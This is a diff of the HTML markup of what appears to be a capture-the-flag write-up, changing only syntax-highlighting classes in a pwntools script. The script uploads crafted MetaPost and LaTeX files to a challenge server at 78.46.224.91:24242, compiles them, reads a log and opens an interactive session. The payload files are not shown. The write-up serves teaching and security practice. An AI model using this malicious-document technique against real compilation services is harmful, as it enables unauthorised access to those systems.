@@ -344,28 +344,28 @@ endfig; \end{document} bye
 
 <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"78.46.224.91"</span><span class="p">,</span> <span class="mi">24242</span><span class="p">)</span>
 
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"creating sss.mp..."</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="s">"create mp sss"</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"creating sss.mp..."</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="s">"create mp sss"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
 <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"sss.mp"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
 <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"</span><span class="err">\</span><span class="s">q"</span><span class="p">)</span>
-<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"\q"</span><span class="p">)</span>
+<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
 
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"creating aaa.tex..."</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="s">"create tex aaa"</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"creating aaa.tex..."</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="s">"create tex aaa"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
 <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"aaa.tex"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
 <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"</span><span class="err">\</span><span class="s">q"</span><span class="p">)</span>
-<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"\q"</span><span class="p">)</span>
+<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
 
-<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="s">"compile aaa"</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="s">"show log qqq"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="s">"compile aaa"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="s">"show log qqq"</span><span class="p">)</span>
 
-<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p><strong>Don’t take LaTEX files from strangers!!</strong></p>
